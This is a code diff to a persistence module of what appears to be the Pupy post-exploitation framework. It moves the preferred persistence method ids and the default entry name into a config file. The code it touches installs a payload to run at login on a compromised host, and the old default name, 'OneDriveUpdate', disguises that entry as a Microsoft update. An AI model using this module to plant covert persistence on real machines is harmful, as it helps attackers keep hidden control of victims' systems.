@@ -96,7 +96,8 @@ class Persistence(PupyModule):
         Return the best method id if possible
         """
         func = {'t': self.log, 'ok': self.success, 'error': self.error, 'info': self.info, 'warning': self.warning}
-        preferred_method = ('16', '22', '17', '23')
+        preferred_methods = self.client.pupsrv.config.get("persistence", "preferred_methods").split(',')
+
         method_id = []
         for tag, message in result:
             if tag in func:
@@ -106,7 +107,7 @@ class Persistence(PupyModule):
                     method_id.append(message.split()[0])
 
         if get_method_id:
-            for p in preferred_method:
+            for p in preferred_methods:
                 if p in method_id:
                     return p
 
@@ -128,7 +129,7 @@ class Persistence(PupyModule):
             self.error('Add payload (remote path to execute at login)')
             return
 
-        name = args.name if args.name else 'OneDriveUpdate'  # should be stored on a config file
+        name = args.name if args.name else self.client.pupsrv.config.get("persistence", "name")
         method = args.method
         if not method and (not args.scan or not args.remove):
             method = self.launch_scan(print_result=False)
